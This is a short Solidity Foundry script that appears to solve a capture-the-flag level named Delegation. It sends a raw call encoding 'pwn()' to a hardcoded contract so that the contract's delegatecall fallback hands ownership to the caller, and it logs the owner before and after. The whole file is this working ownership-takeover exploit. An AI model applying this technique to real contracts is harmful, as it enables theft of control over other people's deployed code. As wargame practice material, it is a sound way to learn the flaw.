// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Delegation} from "src/Delegation.sol";
import {console} from "forge-std/console.sol";

contract DelegationSolution is Script {
    Delegation public delegationInstance = Delegation(0xDB44b63C593E8cC72a622cc485a465668d9123C4);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("contract owner :", delegationInstance.owner());
        (bool success,) = address(delegationInstance).call(abi.encodeWithSignature("pwn()"));
        console.log(success);
        console.log("contract owner :", delegationInstance.owner());
        vm.stopBroadcast();
    }
}
